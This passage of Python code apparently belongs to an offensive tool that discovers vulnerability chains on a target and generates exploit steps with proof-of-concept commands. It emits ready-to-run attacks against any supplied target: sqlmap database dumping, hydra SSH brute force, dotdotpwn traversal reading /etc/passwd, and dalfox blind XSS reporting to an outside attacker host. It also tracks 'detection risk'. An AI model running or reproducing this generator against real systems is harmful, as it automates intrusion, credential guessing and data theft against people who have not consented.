    def discover_chains(self, target, vulnerabilities=None, max_chains=10):
        """Discover possible vulnerability chains for a target."""
        result = {
            "target": target, "success": True,
            "discovered_chains": [], "vulnerability_graph": {},
            "total_chains": 0, "highest_impact_chain": None,
            "timestamp": datetime.now().isoformat()
        }
        try:
            applicable = self._find_applicable_chains(target, vulnerabilities or [])
            result["discovered_chains"] = applicable[:max_chains]
            result["total_chains"] = len(applicable)

            if applicable:
                result["highest_impact_chain"] = max(applicable, key=lambda c: {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(c["impact"], 0))

            result["vulnerability_graph"] = self._build_vuln_graph(applicable)
            result["scan_recommendations"] = self._generate_scan_plan(target, applicable)
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
        return result

    def generate_chain_exploit(self, chain_type, target, parameters=None):
        """Generate a full exploit script for a specific chain type."""
        result = {
            "chain_type": chain_type, "target": target, "success": True,
            "exploit_steps": [], "poc_commands": [],
            "estimated_impact": "", "detection_risk": "",
            "timestamp": datetime.now().isoformat()
        }
        try:
            template = self.CHAIN_TEMPLATES.get(chain_type)
            if not template:
                result["success"] = False
                result["error"] = f"Unknown chain type: {chain_type}. Available: {list(self.CHAIN_TEMPLATES.keys())}"
                return result

            result["chain_name"] = template["name"]
            result["estimated_impact"] = template["impact"]
            result["detection_risk"] = template["detection_risk"]

            for i, step in enumerate(template["steps"]):
                exploit_step = {
                    "step": i + 1, "vulnerability": step["vuln"],
                    "action": step["action"], "tools": step["tools"],
                    "payloads": step.get("payloads", []),
                    "commands": self._generate_step_commands(step, target, parameters or {}),
                }
                result["exploit_steps"].append(exploit_step)
                result["poc_commands"].extend(exploit_step["commands"])
        except Exception as e:
            result["error"] = str(e)
            result["success"] = False
        return result

    def _find_applicable_chains(self, target, vulns):
        chains = []
        vuln_types = set(v.get("type", "").lower() for v in vulns)
        for chain_id, template in self.CHAIN_TEMPLATES.items():
            chain_entry = {
                "chain_id": chain_id, "name": template["name"],
                "impact": template["impact"], "detection_risk": template["detection_risk"],
                "steps": len(template["steps"]),
                "required_vulns": [s["vuln"] for s in template["steps"]],
                "tools_needed": list(set(t for s in template["steps"] for t in s["tools"])),
            }
            first_vuln = template["steps"][0]["vuln"].lower().replace(" ", "_")
            if first_vuln in vuln_types or not vulns:
                chain_entry["applicability"] = "confirmed" if first_vuln in vuln_types else "potential"
            else:
                chain_entry["applicability"] = "unconfirmed"
            chains.append(chain_entry)
        chains.sort(key=lambda c: {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(c["impact"], 0), reverse=True)
        return chains

    def _build_vuln_graph(self, chains):
        nodes = set()
        edges = []
        for chain in chains:
            for i, vuln in enumerate(chain["required_vulns"]):
                nodes.add(vuln)
                if i > 0:
                    edges.append({"from": chain["required_vulns"][i-1], "to": vuln, "chain": chain["chain_id"]})
        return {"nodes": list(nodes), "edges": edges}

    def _generate_scan_plan(self, target, chains):
        tools_needed = set()
        for chain in chains:
            tools_needed.update(chain.get("tools_needed", []))
        return {"target": target, "tools_to_run": list(tools_needed), "order": ["nuclei", "ffuf", "sqlmap", "dalfox", "dotdotpwn"]}

    def _generate_step_commands(self, step, target, params):
        commands = []
        for tool in step["tools"]:
            if tool == "nuclei":
                commands.append(f"nuclei -u {target} -severity critical,high")
            elif tool == "sqlmap":
                commands.append(f"sqlmap -u '{target}' --batch --dbs")
            elif tool == "ffuf":
                commands.append(f"ffuf -u {target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt")
            elif tool == "dalfox":
                commands.append(f"dalfox url '{target}' --blind https://attacker.xss.ht")
            elif tool == "hydra":
                commands.append(f"hydra -L users.txt -P passwords.txt {target} ssh")
            elif tool == "dotdotpwn":
                commands.append(f"dotdotpwn -m http -h {target} -f /etc/passwd")
            else:
                commands.append(f"# {tool}: {step['action']}")
        return commands


